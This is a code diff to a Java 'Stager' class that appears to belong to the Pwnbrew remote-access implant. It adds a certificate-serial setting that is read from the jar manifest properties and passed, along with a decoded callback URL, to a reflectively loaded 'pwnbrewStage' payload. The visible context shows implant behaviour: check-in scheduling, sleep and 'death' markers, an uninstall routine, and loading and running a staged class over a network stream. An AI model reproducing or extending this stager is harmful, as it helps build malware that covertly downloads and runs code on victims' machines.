@@ -75,6 +75,7 @@ public class Stager extends ClassLoader {
     public static final SimpleDateFormat CHECKIN_DATE_FORMAT = new SimpleDateFormat("MM/dd/yyyy--HH:mm");
     public static final String DEATH_LABEL ="JAR-ID";
     public static final String SLEEP_LABEL = "JVM-ID";
+    public static final String CERT_SERIAL_LABEL = "CRT-ID";
     public static final String URL = "Private";
     public static final String STAG_PROP_FILE ="META-INF/MANIFEST.MF";
     
@@ -152,8 +153,11 @@ public class Stager extends ClassLoader {
                         InputStream theIS = aTimer.getInputStream();
                         OutputStream theOS = new ByteArrayOutputStream();
                 
+                        //See if a cert serial was set
+                        String certSerial = localProperties.getProperty(CERT_SERIAL_LABEL, null);
+                        
                         Stager theStager = new Stager();
-                        theStager.start(theIS, theOS, decodedURL );
+                        theStager.start(theIS, theOS, decodedURL, certSerial );
 
                     } else {
                         uninstall();
@@ -314,7 +318,7 @@ public class Stager extends ClassLoader {
      * @param paramOutputStream
      * @param passedURL
      */
-    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL ) {
+    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL, String certSerial ) {
         
         try {
             
@@ -376,8 +380,8 @@ public class Stager extends ClassLoader {
                         //Start staged class
                         if( localClass != null ){
                             Object pwnbrewStage = localClass.newInstance();
-                            String[] theObjArr = new String[]{passedURL};
-
+                            String[] theObjArr = new String[]{passedURL, certSerial};
+                        
                             Method aMethod = localClass.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class });
                             aMethod.invoke(pwnbrewStage, new Object[] { localDataInputStream, paramOutputStream, theObjArr });
                         }
